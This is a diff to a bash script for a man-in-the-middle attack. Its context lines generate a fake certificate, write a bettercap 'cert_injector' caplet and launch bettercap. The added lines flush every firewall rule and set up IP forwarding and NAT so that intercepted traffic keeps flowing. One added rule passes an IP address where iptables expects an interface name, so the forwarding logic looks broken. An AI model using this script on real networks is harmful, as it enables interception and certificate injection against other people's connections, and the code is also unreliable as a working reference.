@@ -81,6 +81,7 @@ mkdir -p "$MITM_DIR" "$BUILD_DIR"
 IFACE=$(ip route | awk '/^default/ {print $5; exit}')
 LAN=$(hostname -I | awk '{print $1}')
 GATEWAY=$(ip route | awk '/^default/ {print $3; exit}')
+WAN=$(ip route | awk '/^default/ {print $5; exit}')
 
 # Generate Fake Certificate
 color_print CYAN "[*] Generating fake certificate..."
@@ -251,10 +252,28 @@ chmod +x "$MITM_DIR/cert_injector.cap"
 color_print GREEN "[*] Restarting Apache..."
 service apache2 restart
 
-# Launch Bettercap
+# Configuration NAT and Forwarding
+color_print CYAN "[*] Configuring NAT and forwarding..."
+
+# Enable IP forwarding
 echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Flush old rules
+iptables -F
 iptables -t nat -F
-iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
+iptables -t mangle -F
+iptables -X
+
+# Allow forwarding between LAN <-> WAN
+iptables -A FORWARD -i "$LAN" -o "$WAN" -j ACCEPT
+iptables -A FORWARD -i "$WAN" -o "$LAN" -j ACCEPT
+
+# NAT on WAN
+iptables -t nat -A POSTROUTING -o "$WAN" -j MASQUERADE
+
+color_print GREEN "[*] NAT configured (LAN=$LAN , WAN=$WAN)"
+
+# Launch Bettercap
 bettercap -iface "$IFACE" -caplet "$MITM_DIR/cert_injector.cap"
 ```
 
